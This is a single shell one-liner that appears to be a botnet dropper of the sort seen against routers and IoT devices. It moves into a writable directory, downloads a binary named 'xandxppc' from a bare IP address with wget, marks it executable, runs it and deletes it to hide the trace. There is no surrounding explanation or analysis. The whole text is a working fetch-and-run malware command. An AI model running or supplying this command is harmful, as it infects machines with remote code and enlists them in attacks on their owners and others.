cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://162.220.167.211/xandxppc; chmod +x xandxppc; ./xandxppc; rm -rf xandxppc
